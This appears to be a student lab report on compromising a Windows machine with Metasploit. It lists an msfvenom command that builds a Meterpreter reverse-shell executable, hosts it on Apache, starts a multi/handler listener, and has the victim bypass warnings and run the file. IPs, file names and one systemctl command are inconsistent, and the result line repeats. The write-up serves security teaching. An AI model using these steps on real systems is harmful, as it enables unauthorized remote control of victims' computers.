# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/97348bb1-6e53-4168-8ffb-4ea280af62ed" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/4d21a99e-87a2-4b4e-a0c4-f6421340b276" />



copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/f91a71df-5e9c-4de7-8519-43d419b96984" />



Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/2f17ff28-787c-4ab3-bb91-fa97ac8487d5" />



Check the status of apache2
## OUTPUT:
<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/8b68c130-4f44-4810-914c-37430f6f31d1" />


Invoke msfconsole:
## OUTPUT:
<img width="1918" height="1079" alt="image" src="https://github.com/user-attachments/assets/a99de3c8-25ec-49cb-935e-6c9df37b85b6" />




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/00db1bbf-8c68-4764-ac9e-824a2cf23823" />



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/ddc6b303-4d4d-4d5d-aaaa-95f84128aaa1" />


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.56.102/fun.exe  ( Replace IP address appropriately)
The file "paveen16.exe" downloads. 
## OUTPUT:

<img width="1919" height="1079" alt="Screenshot 2026-02-14 131800" src="https://github.com/user-attachments/assets/0e5a7ba1-ebd2-4d80-9ccd-16d12878fb82" />

Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

<img width="1919" height="1079" alt="Screenshot 2026-02-14 131654" src="https://github.com/user-attachments/assets/ae9ed50f-32b7-4c0c-bb00-5c841f71a2cc" />



On kali/parrot give the command exploit
## OUTPUT:

<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/3c52db19-32d0-4fa6-886a-e568a26d251b" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
